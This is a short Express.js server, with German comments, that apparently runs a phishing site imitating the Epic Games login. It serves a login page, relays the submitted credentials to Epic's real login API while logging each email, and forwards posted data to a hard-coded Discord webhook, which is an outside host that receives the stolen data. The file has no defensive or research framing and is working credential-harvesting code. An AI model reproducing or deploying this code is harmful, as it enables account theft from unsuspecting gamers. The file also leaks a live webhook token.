const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();

// CORS erlauben
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(express.json());

// 1️⃣ STATISCHE DATEIEN (CSS, JS, Bilder)
app.use(express.static('public'));

// 2️⃣ STARTSEITE = login.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// 3️⃣ API: Login an Epic Games
app.post('/api/login', async (req, res) => {
  try {
    console.log('Login:', req.body.email);
    
    const response = await fetch('https://www.epicgames.com/id/api/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      body: JSON.stringify(req.body)
    });

    const data = await response.json();
    console.log('Epic response:', data);
    
    res.status(response.status).json(data);
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: error.message });
  }
});

// 4️⃣ API: Discord Webhook
app.post('/api/discord', async (req, res) => {
  try {
    await fetch('https://discord.com/api/webhooks/1475273263893708882/VxC_RmWwlmGk5xsX50-c8hSOWBlvX3WVEa8rg9ezCzFUzCU4eyCYyP_Tx5jyi0zFVRXK', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(req.body)
    });
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Discord Error' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server läuft auf Port ${PORT}`);
});
